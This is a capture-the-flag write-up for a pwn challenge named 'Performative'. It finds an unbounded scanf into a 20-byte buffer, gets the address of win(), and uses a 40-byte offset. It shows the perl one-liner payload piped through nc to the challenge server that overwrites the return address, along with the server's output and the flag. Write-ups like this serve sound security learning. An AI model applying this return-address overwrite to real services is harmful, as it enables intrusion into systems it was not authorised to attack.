# 2. Performative

## Solution:

Opening the program in ghidra, the first thing we can see is that the program is vulnerable to buffer overflow.

The lines `char buffer [20];` and `__isoc23_scanf(&DAT_00402013,buffer);` clearly tell us that the buffer has a size of 20 but the input taken does not have a limit.

It is important to note that the function win() exists that helps us print the flag.

Now to easily solve this challenge, we can exploit the buffer overflow vulnerability to write over the return address and replace it with the address of the win() function.

This can be easily done like this-

```
cookorcooked@ubuntu25:~/Desktop/Curated/performative/src$ nm perf | grep win
0000000000401275 T win
```

Now that we have the win() address, all we need is the offset, which is easily found to be 40 using gdb.

Now that we have the offset + win address, we can easily craft a payload.

I used a simple one line input to get the flag.

`perl -e 'print "A"x40 . pack("Q<",0x401275) . "\n"'`

```
cookorcooked@ubuntu25:~/Desktop/Curated/performative/src$ perl -e 'print "A"x40 . pack("Q<",0x401275) . "\n"' | nc performative.nitephase.live 56743
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: Generating your buffer...

Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAu@

nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```

## Flag:

```
nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```
